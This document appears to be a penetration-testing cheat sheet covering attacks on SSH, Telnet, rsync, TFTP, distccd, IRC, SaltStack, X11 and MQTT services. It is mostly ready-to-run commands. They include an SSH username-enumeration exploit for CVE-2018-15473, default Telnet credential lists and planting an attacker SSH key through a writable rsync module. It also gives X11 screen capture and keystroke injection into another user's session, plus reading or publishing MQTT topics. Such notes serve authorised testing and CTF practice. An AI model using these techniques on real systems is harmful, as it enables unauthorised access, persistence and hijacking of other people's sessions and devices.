# SSH, Telnet, Finger, rsync, TFTP, and other raw-socket services

## SSH: 22
```bash
ssh-keyscan -T 5 <IP>
ssh -v <USER>@<IP>
chmod 600 <key-file>; ssh -i <key-file> <USER>@<IP>
```

### User enumeration (OpenSSH < 7.7, CVE-2018-15473)
Auth-packet timing/response difference leaks whether a username exists, before any password is checked:
```bash
git clone https://gitlab.com/epi052/cve-2018-15473
cd cve-2018-15473 && pip install -r requirements.txt   # skip on Kali, paramiko is already there
./ssh-username-enum.py -u <USER> <IP>
./ssh-username-enum.py -w <wordlist> -t 10 <IP>
```
- Check the version banner first (`ssh -v`); the bug is patched in 7.7 and later.

## Telnet and Finger: 23, 79
```bash
nc -nv <IP> 23
finger @<IP>
finger <USER>@<IP>
```
- Empty finger output is inconclusive.
- Telnet default creds worth trying first: `admin:admin`, `root:root`, `root:` (no password), `admin:password`, device-specific defaults from the banner (router/switch/IoT firmware) — check the vendor's default-password list before brute-forcing.

## rsync daemon: 873
```bash
rsync rsync://<IP>/
rsync rsync://<IP>/<MODULE>/
rsync rsync://<IP>/<MODULE>/<FILE> ./
```
- Hidden/authenticated modules may not list.

### rsync write access
```bash
echo '<SSH-PUBKEY>' > authorized_keys
rsync authorized_keys rsync://<IP>/<MODULE>/.ssh/authorized_keys
rsync authorized_keys rsync://<IP>/<MODULE>/root/.ssh/authorized_keys
```
- Only works if the module's path maps into a real home directory and SSH is reachable; check the module's actual filesystem target first (`rsync -n` dry-run, or just read what a test file upload lands next to).

## TFTP: 69/UDP
No listing; request a known filename.

```bash
curl -o <local-file> 'tftp://<IP>/<FILE>'
```
```bash
tftp <IP>
```
```text
put local-file.txt remote-file.txt
```
- `curl` is read-only for TFTP; `put` needs the interactive `tftp` client. No auth — a writable TFTP root is often a PXE/network-boot config directory.

## distccd: 3632
Unauthenticated RPC that runs an arbitrary compiler — point it at a compiler wrapper that runs a shell instead of compiling:
```bash
nmap -p3632 -sV --script distcc-cve2004-2687 <IP>
```
- Needs a distcc client or the equivalent raw protocol; confirm the version/CVE first; this is an old (2002-2004) distccd misconfiguration, rarely exposed today.

## IRC: 6667
```bash
nc -nv <IP> 6667
```
```text
NICK <NAME>
USER <NAME> 0 * :<NAME>
```
- Banner (`NOTICE`/`:server 001`) gives the daemon and version — check for known backdoored builds (e.g. UnrealIRCd 3.2.8.1) before anything else.

## Salt: 4505, 4506
SaltStack master (4505 = publish, 4506 = request/reply). Unauthenticated versions had CVE-2020-11651/11652 (auth bypass + directory traversal → RCE):
```bash
nmap -p4505,4506 -sV <IP>
```
- Check the version against the CVE; exploitation needs the salt-specific ZeroMQ/MessagePack protocol, not a plain socket payload.

## X11: 6000
No authentication (`xhost +` or a misconfigured `.Xauthority`) gives screen capture and window/input control. Display number = port − 6000:
```bash
nmap -sV --script x11-access -p 6000 <IP>
xdpyinfo -display <IP>:0
xwininfo -root -tree -display <IP>:0
```
```bash
xwd -root -screen -silent -display <IP>:0 > screen.xwd
convert screen.xwd screen.png
```
```bash
WID=$(xdotool search --onlyvisible --name '.*' --display <IP>:0 | head -n1)
xdotool windowactivate --sync --display <IP>:0 "$WID"
xdotool type --delay 50 --display <IP>:0 'touch /tmp/pwned'
xdotool key --display <IP>:0 Return
```
- `xdotool type` into a reactivated window (e.g. an open terminal) injects keystrokes as whoever is logged into that session — activate the window first, `--window` targeting alone is unreliable (`XSendEvent` delivery).

## MQTT: 1883
```bash
mosquitto_sub -h <IP> -t '#' -v
mosquitto_pub -h <IP> -t '<TOPIC>' -m '<MESSAGE>'
```
- `-t '#'` subscribes to every topic — IoT/SCADA creds, sensor data and control topics often appear in plaintext with no auth configured at all.
